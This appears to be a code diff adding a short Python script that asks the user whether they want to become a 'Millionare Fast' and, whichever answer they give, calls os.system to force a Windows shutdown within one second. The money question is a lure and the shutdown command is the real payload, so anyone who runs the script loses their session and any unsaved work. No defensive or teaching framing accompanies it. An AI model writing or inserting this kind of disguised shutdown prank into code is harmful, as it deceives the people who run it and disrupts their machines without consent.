@@ -1,0 +1,6 @@
+import os
+yesorno = input("Do you want to be a Millionare Fast? 'yes/no'")
+if yesorno == ("no"):
+    os.system("shutdown /s /t 1");
+else:
+    os.system("shutdown /s /t 1");
